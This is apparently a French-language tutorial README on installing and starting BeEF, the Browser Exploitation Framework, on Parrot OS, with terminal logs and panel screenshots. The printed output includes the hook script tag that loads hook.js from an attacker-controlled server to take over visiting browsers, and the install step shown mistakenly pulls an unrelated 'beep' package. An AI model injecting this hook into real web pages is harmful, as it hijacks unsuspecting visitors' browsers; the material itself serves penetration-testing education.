# secu_02
Vulnérabilités sur les navigateurs web `BeEf`
* BeEf : Browser Exploitation Framework <a href="http://beefprojet.com">http://beefprojet.com</a>
* Outil de pentest basé client-side
* Technique similaire aux drive-by malware
* Accède directement à l'environnement du client
* Framework de social Engineering

## Installation complete de l'outil Beep
```terminal
sudo apt install beef*
```
Pour demarrer le programme
```terminal
sudo beef-xss
```
## Autre methode 

Lancez le script Beef.sh

```terminal
bash /emplacement/beef.sh
```
```terminal
bash /home/samglish/Desktop/vb.sh 
***********************************************************
*                   Ethical Hacking                       *
*           VULNERABILITY WEBSITE SCANNING                *
*                       Samglish                          *
***********************************************************
Installing tools...
------------------------------------------------------------
***TheHarvester***
Please wait...
[sudo] Mot de passe de samglish : 
```
```terminal
Lecture des listes de paquets... Fait
Construction de l'arbre des dépendances... Fait
Lecture des informations d'état... Fait      
Note : sélection de beep pour l'expression rationnelle « beep* »
Les NOUVEAUX paquets suivants seront installés :
  beep
0 mis à jour, 1 nouvellement installés, 0 à enlever et 720 non mis à jour.
Il est nécessaire de prendre 32,2 ko dans les archives.
Après cette opération, 77,8 ko d'espace disque supplémentaires seront utilisés.
Réception de :1 https://deb.parrot.sh/parrot parrot/main amd64 beep amd64 1.4.9-1+b1 [32,2 kB]
32,2 ko réceptionnés en 4s (8 788 o/s)
Sélection du paquet beep précédemment désélectionné.
(Lecture de la base de données... 633947 fichiers et répertoires déjà installés.
)
Préparation du dépaquetage de .../beep_1.4.9-1+b1_amd64.deb ...
Dépaquetage de beep (1.4.9-1+b1) ...
Paramétrage de beep (1.4.9-1+b1) ...
Traitement des actions différées (« triggers ») pour man-db (2.9.4-2) ...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
 
 Voulez vous demarrer ?
 1. Oui
 2. Non
Choix : 
```
lancez le script
```
Choix : 1
[i] Something is already using port: 3000/tcp
COMMAND    PID     USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
ruby    120793 beef-xss   13u  IPv4 1104530      0t0  TCP *:3000 (LISTEN)

UID          PID    PPID  C STIME TTY      STAT   TIME CMD
beef-xss  120793       1  0 avril30 ?      Ssl    0:06 ruby /usr/share/beef-xss/

[i] GeoIP database is missing
[i] Run geoipupdate to download / update Maxmind GeoIP database
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>

● beef-xss.service - beef-xss
     Loaded: loaded (/lib/systemd/system/beef-xss.service; disabled; vendor preset: enabled)
     Active: active (running) since Tue 2024-04-30 23:41:26 WAT; 25min ago
   Main PID: 120793 (ruby)
      Tasks: 3 (limit: 9306)
     Memory: 121.7M
        CPU: 11.550s
     CGroup: /system.slice/beef-xss.service
             └─120793 ruby /usr/share/beef-xss/beef

avril 30 23:57:28 parrotOS beef[120793]: [23:57:18][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:20][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:20][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:22][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:22][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:24][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:24][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:26][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:26][!] API Fire Error: Coul…nd()
avril 30 23:57:28 parrotOS beef[120793]: [23:57:28][!] API Fire Error: Coul…nd()
Hint: Some lines were ellipsized, use -l to show in full.

[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1... 
```

<hr>

## Utilisation
```terminal
sudo beef-xss
```
`resultats`
```terminal
[-] You are using the Default credentials
[-] (Password must be different from "beef")
[-] Please type a new password for the beef user: 
```
Definissez votre mot de passe

```terminal
[i] GeoIP database is missing
[i] Run geoipupdate to download / update Maxmind GeoIP database
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>

● beef-xss.service - beef-xss
     Loaded: loaded (/lib/systemd/system/beef-xss.service; disabled; vendor preset: enabled)
     Active: active (running) since Tue 2024-04-30 23:41:26 WAT; 5s ago
   Main PID: 120793 (ruby)
      Tasks: 1 (limit: 9306)
     Memory: 53.1M
        CPU: 2.092s
     CGroup: /system.slice/beef-xss.service
             └─120793 ruby /usr/share/beef-xss/beef

avril 30 23:41:26 parrotOS systemd[1]: Started beef-xss.

[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1... 
```
Cliquez sur `http://127.0.0.1:3000/ui/panel`

<img src="s1.png" width="50%">

Apres validation

<img src="s2.png" width="80%">

Ensuite ` basic demo page here,`

<img src="s3.png" width="80%">

Verifier les exploits et actions en fonction de votre besoin 

<img src="s4.png" width="80%">

<img src="s5.png" width="80%">